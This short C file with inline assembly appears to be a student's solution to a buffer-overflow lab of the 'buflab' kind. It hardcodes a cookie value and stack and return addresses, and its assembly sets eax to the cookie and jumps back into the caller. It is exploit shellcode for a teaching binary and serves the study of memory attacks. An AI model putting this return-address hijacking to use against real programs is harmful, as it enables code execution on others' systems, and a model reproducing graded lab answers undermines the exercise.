int cookie = 0x77fe0719;
int *global_value = (int *) 0x804d198;

// ebp when call getbuf: 0x5568b110
// return to: 0x804951d
// eax set to cookie

int main() {
  // set original ebp value to original place
  // set eax as cookie
  asm("movl $0x77fe0719, %eax");
  // return
  asm("pushl $0x804951d");
  asm("ret");
  return 0;
}